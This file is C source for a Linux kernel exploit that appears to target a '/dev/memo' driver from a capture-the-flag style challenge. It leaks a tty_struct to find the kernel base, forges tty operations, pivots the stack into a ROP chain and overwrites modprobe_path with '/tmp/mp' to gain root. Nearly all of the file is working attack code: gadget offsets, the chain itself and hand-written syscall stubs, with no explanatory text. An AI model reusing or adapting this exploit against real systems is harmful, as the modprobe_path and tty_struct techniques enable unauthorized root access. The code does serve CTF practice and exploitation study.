// gcc exploit.c -masm=intel -fno-PIE -nostdlib -no-pie -o exploit
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/ioctl.h>

size_t read(int fd, void *buf, size_t count);
size_t write(int fd, void *buf, size_t count);
int open(const char* pathname, int flags, ...);
int close(int fd);
off_t lseek(int fd, off_t offset, int whence);
void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
int mprotect(void *addr, size_t len, int prot);
int munmap(void *addr, size_t length);
int ioctl(int fd, unsigned long request, ...);
int execve(const char *filename, char *const argv[], char *const envp[]);
void exit(int status);

void *memset(void *s, int c, size_t n);
void *memcpy(void *dest, const void *src, size_t n);
unsigned long strlen(const char *s);
int puts(const char *s);
static void dump(void *buf, unsigned int size);

/* exploit */
#define BASE			0xffffffff81000000
#define OFFSET(addr)	((addr) - (BASE))
#define ADDR(offset)	(kernel_base + (offset))

unsigned long kernel_base				= 0;
unsigned long ofs_do_tty_hangup			= OFFSET(0xffffffff8140f6b0);
unsigned long ofs_msleep				= OFFSET(0xffffffff810c4740);
unsigned long ofs_ret					= OFFSET(0xffffffff81008ae8);	// ret
unsigned long ofs_leave					= OFFSET(0xffffffff81008ae7);	// leave ; ret
unsigned long ofs_pop_rsp				= OFFSET(0xffffffff81056b32);	// mov rsp, qword [rsp] ; pop rbp ; ret
unsigned long ofs_pop_rdi				= OFFSET(0xffffffff81001268);	// pop rdi ; ret
unsigned long ofs_pop_rax				= OFFSET(0xffffffff81023301);	// pop rai ; ret
unsigned long ofs_mov_qprax_rdi			= OFFSET(0xffffffff8116150c); 	// mov qword [rax], rdi ; ret

unsigned long ofs_modprobe_path			= OFFSET(0xffffffff82200000 + (0x1442260-0x1400000));
/*
$ strings -tx vmlinux | grep /sbin/modprobe
1442260 /sbin/modprobe

$ readelf -S vmlinux | grep "] .data "
[12] .data             PROGBITS         ffffffff82200000  01400000
*/

/*
unsigned long ofs_ret2user				= OFFSET(0xffffffff81a00106);
unsigned long ofs_run_cmd				= OFFSET(0xffffffff8107bf60);
unsigned long ofs_add_rsp_58			= OFFSET(0xffffffff812f76d5);	// add rsp, 0x58 ; ret
unsigned long ofs_mov_cr4_rdi			= OFFSET(0xffffffff8104b6a1);	// mov cr4, edi ; push rdx ; popfq  ; ret
unsigned long ofs_mov_rdi_rax			= OFFSET(0xffffffff827841f0);	// mov rdi, rax ; rep movsd  ; ret
unsigned long ofs_swapgs_popfq			= OFFSET(0xffffffff81a00e1a);	// swapgs  ; popfq  ; ret
unsigned long ofs_iretq					= OFFSET(0xffffffff81020b12);	// iretq

struct cred* (*prepare_kernel_cred)(struct task_struct *daemon) = 0xffffffff8107bb50;
int (*commit_creds)(struct cred *new) = 0xffffffff8107b8b0;
*/

void _start(void){
	int fd, ptmx_fd;
	char buf[0x400] = {0};
	unsigned long *tty_struct;
	unsigned long tty_operations[0x80] = {};
	unsigned long *fake_stack;

	if((fd = open("/dev/memo", O_RDWR|O_CLOEXEC)) < 0){
		puts("/dev/memo");
		return;
	}

	if((ptmx_fd = open("/dev/ptmx", O_RDWR|O_NOCTTY)) < 0){
		puts("/dev/ptmx");
		return;
	}

	write(ptmx_fd, "AAAAAAAA", 8);

	lseek(fd, 0x400-8, SEEK_SET);
	read(fd, buf, 0x400);

	tty_struct = buf+8;
	unsigned long do_tty_hangup		= tty_struct[0x4a];
	unsigned long kernel_base		= do_tty_hangup - ofs_do_tty_hangup;
	unsigned long addr_write_buf	= tty_struct[0x51];

	//printf("kernel_base	 = %p\n", kernel_base);
	if(kernel_base & (0x1000-1))
		return;

	tty_operations[12] = ADDR(ofs_leave);		// 1 (ioctl)

	fake_stack = tty_operations+1;
	*(fake_stack++) = ADDR(ofs_pop_rax);		// 4
	*(fake_stack++) = ADDR(ofs_modprobe_path);
	*(fake_stack++) = ADDR(ofs_pop_rdi);
	memcpy(fake_stack++, "/tmp/mp", 8);
	*(fake_stack++) = ADDR(ofs_mov_qprax_rdi);
	*(fake_stack++) = ADDR(ofs_pop_rdi);
	*(fake_stack++) = 10*60*1000;
	*(fake_stack++) = ADDR(ofs_msleep);

	write(ptmx_fd, tty_operations, sizeof(tty_operations));

	tty_struct[1] = ADDR(ofs_ret);				// 2
	tty_struct[2] = ADDR(ofs_pop_rsp);			// 3
	tty_struct[3] = addr_write_buf;
	lseek(fd, 0x400-8, SEEK_SET);
	write(fd, buf, 0x30);

	ioctl(ptmx_fd, 0xdeadbeef, 0xcafebabe);
}

/* utils */
void *memset(void *s, int c, size_t n){
	for(int i=0; i<n; i++)
		*(char*)(s+i) = (char)c;
	return s;
}

void *memcpy(void *dest, const void *src, size_t n){
	for(int i=0; i<n; i++)
		*(char*)(dest+i) = *(char*)(src+i);
	return dest;
}

unsigned long strlen(const char *s){
	unsigned long i;
	for(i=0; s[i]; i++);
	return i;
}

int puts(const char *s){
	int n;

	n = write(1, (void*)s, strlen(s));
	write(1, "\n", 1);

	return n;
}

asm(
"read:\n"
"mov rax, 0\n"
"syscall\n"
"ret\n"

"write:\n"
"mov rax, 1\n"
"syscall\n"
"ret\n"

"open:\n"
"mov rax, 2\n"
"syscall\n"
"ret\n"

"close:\n"
"mov rax, 3\n"
"syscall\n"
"ret\n"

"lseek:\n"
"mov rax, 8\n"
"syscall\n"
"ret\n"

"mmap:\n"
"mov rax, 9\n"
"mov r10, rcx\n"
"syscall\n"
"ret\n"

"mprotect:\n"
"mov rax, 10\n"
"syscall\n"
"ret\n"

"munmap:\n"
"mov rax, 11\n"
"syscall\n"
"ret\n"

"ioctl:\n"
"mov rax, 16\n"
"syscall\n"
"ret\n"

"execve:\n"
"mov rax, 59\n"
"syscall\n"
"ret\n"

"exit:\n"
"mov rax, 60\n"
"syscall\n"
);

